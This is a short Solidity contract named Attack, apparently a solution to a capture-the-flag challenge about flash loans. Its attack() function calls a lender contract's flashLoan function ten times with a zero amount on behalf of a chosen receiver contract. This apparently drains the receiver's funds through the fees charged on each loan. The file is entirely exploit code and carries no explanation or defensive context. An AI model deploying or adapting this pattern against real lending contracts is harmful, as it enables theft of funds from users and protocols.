// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Attack {
    address public receiverAddress;
    address public lenderAddress;

    constructor(address _receiverAddress, address _lenderAddress) {
        receiverAddress = _receiverAddress;
        lenderAddress = _lenderAddress;
    }

    function attack() public {
        for (uint256 i = 0; i < 10; i++) {
            (bool success, bytes memory returndata) = lenderAddress.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    receiverAddress,
                    0
                )
            );
        }
    }
}
